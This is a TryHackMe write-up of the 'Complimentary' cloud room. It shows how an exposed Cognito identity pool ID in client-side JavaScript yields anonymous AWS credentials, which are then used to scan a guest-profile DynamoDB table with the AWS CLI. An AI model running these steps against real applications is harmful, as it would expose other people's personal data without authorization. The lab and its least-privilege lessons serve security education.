# TryHackMe — Complimentary Writeup

> **Author:** **Soumyabrata Mukherjee**  
> TryHackMe Profile: https://tryhackme.com/p/soumyabratamukherjee64

---

## Acknowledgements

This writeup has been prepared by **Soumyabrata Mukherjee**.

Special thanks to the **TryHackMe Discord community** (https://discord.gg/tryhackme) and everyone who helped with discussions and hints throughout the challenge.

---

# Challenge Information

| Field | Details |
|-------|---------|
| **Room Name** | Complimentary |
| **Category** | Cloud |
| **Difficulty** | Easy |
| **Platform** | TryHackMe |

### Description

> *Install the free app and it hands your phone a set of cloud keys, the same set it hands everyone. They're read-only, but read-only of every guest's contacts, location, and passwords, not just Lambo's. She gave consent. Technically.*

---

# Previous Writeups

- **Publisher Room**  
  https://app.notion.com/p/TryHackMe-Publisher-Room-2d4c8aaddc7380ff94bbf03a910ae404?source=copy_link

- **Advent of Cyber 2025 – Side Quest 3**  
  https://app.notion.com/p/TryHackMe-Side-Quest-3-Solution-Advent-of-Cyber-2025-2d3c8aaddc738032ac42f4f2f9b29407?source=copy_link

---

# Task 1

## Overview

![Task 1](https://cdn-images.tryhackme.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1784111354645.png)

This task only requires clicking the **Completed** button.

---

# Task 2

## Objective

The Byte Lotus Wellness application allows anyone to use it without creating an account. Although there is no login page, the application somehow knows information about each guest.

Our objective is to determine how the application authenticates users and whether those permissions can be abused to access information belonging to other guests.

**Target**

```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
```

---

## Inspecting the Client-Side Code

The first step was to inspect the JavaScript source (`app.js`).

Several interesting values immediately stood out.

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

The application also generated guest IDs using JavaScript's `Math.random()`.

```javascript
function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}
```

This immediately revealed two important pieces of information:

- The application authenticates users using **AWS Cognito**.
- The DynamoDB table name is exposed directly in the client-side code.

---

## Initial Thoughts

One possible approach would have been brute-forcing guest IDs since every identifier follows the format:

```
guest-xxxxxxxx
```

Because `Math.random()` is not intended for cryptographic purposes, such IDs may be predictable.

However, brute-forcing thousands of possible guest IDs would be both time-consuming and unnecessary.

Instead, I looked for a way to obtain valid AWS credentials directly from Cognito.

---

## Obtaining Temporary AWS Credentials

First, configure the AWS CLI region.

```bash
export AWS_DEFAULT_REGION="us-east-1"
```

Using the exposed Cognito Identity Pool ID, request an anonymous identity.

```bash
aws cognito-identity get-id \
--identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

Example output:

```json
{
    "IdentityId": "us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

Next, request temporary credentials for that identity.

```bash
aws cognito-identity get-credentials-for-identity \
--identity-id "<IDENTITY_ID>"
```

AWS returns temporary credentials containing:

- Access Key ID
- Secret Access Key
- Session Token

These credentials inherit the permissions granted to the application's anonymous guest role.

---

## Configuring the AWS CLI

Before interacting with AWS services, the temporary credentials must be exported as environment variables.

The official AWS documentation explains this process:

https://docs.aws.amazon.com/sdkref/latest/guide/environment-variables.html

```bash
export AWS_ACCESS_KEY_ID="<ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<SECRET_KEY>"
export AWS_SESSION_TOKEN="<SESSION_TOKEN>"
```

Once configured, every AWS CLI command will authenticate using these temporary credentials.

---

## Dumping the DynamoDB Table

Since the JavaScript source already disclosed the table name,

```
complimentary-GuestWellnessProfiles
```

the next objective was to dump its contents.

While searching for the appropriate AWS CLI command, I referred to the following Stack Overflow discussion:

**Export data from DynamoDB**

https://stackoverflow.com/questions/18896329/export-data-from-dynamodb

Using the suggested approach:

```bash
aws dynamodb scan \
--table-name "complimentary-GuestWellnessProfiles" \
> scan.txt
```

The scan completed successfully, indicating that the anonymous guest role had permission to read every item stored in the table.

---

## Retrieving the Flag

Finally, search the dumped output for the flag.

```bash
cat scan.txt | grep "THM{"
```

Output:

```text
If you're reading this, the wellness app's guest role can read every profile, not just its own.
THM{REDACTED}
```

Submitting the recovered flag completes the challenge.

---

# Methodology Summary

1. Inspect the application's JavaScript source.
2. Discover the AWS Cognito Identity Pool ID.
3. Identify the DynamoDB table name.
4. Obtain an anonymous Cognito identity.
5. Request temporary AWS credentials.
6. Export the credentials as environment variables.
7. Scan the DynamoDB table using the AWS CLI.
8. Search the output for the flag.
9. Submit the flag.

---

# Key Takeaways

- Client-side applications should never expose unnecessary cloud infrastructure details.
- Public Cognito Identity Pools must follow the principle of least privilege.
- Temporary AWS credentials are only as secure as the IAM permissions attached to them.
- Anonymous users should never have unrestricted read access to sensitive DynamoDB tables.
- Reviewing exposed JavaScript files is an essential step during cloud security assessments.

---

# References

- AWS SDK Environment Variables  
  https://docs.aws.amazon.com/sdkref/latest/guide/environment-variables.html

- Stack Overflow — Export data from DynamoDB  
  https://stackoverflow.com/questions/18896329/export-data-from-dynamodb

---

# Conclusion

**Complimentary** is an excellent introductory cloud security challenge that demonstrates how seemingly harmless client-side information can lead to serious security issues. By exposing an AWS Cognito Identity Pool ID and assigning overly permissive permissions to anonymous users, the application allows anyone to obtain temporary AWS credentials and enumerate an entire DynamoDB table. The room effectively illustrates the importance of least-privilege IAM policies and careful handling of cloud resources exposed through frontend applications.

---

**Author:** Soumyabrata Mukherjee  
**Platform:** TryHackMe  
**Category:** Cloud
